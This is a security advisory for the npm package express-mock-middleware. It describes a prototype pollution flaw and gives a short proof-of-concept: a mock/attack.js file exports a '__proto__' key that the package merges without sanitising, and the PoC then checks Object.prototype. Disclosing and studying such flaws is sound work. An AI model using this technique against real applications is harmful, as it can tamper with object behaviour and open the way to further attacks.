# Overview
`express-mock-middleware` is a simple mock middleware for express, this package are vulnerable to Prototype Pollution, exported functions by the package can be tricked into adding or modifying properties of the Object.prototype``. 

Exploitation of this vulnerability requires creation of a new directory where an attack code can be placed which will then be exported by `express-mock-middleware`. As such, this is considered to be a low risk. 

# Proof of Concept
```
/*
 * This program requires an input file under folder named "mock". 
 * 
 * To run the exploit, we need to new a "mock" directory, inside this directory, 
 * we create our attack JS file. This program will parse the exported functions
 * and put the parsed result to the expolit point without sanitization. 
 * The folder structure looks like:
 * 
 * express-mock-middleware.js
 * mock
 * --attack.js
 *
 * the content of "mock/attack.js" can be the following:
 * 
 * var attack_function = function (){};
   module.exports =  {
     "toString __proto__": attack_function
   }
 * */

var a = require("express-mock-middleware");
var app = a();
console.log({}.toString);
```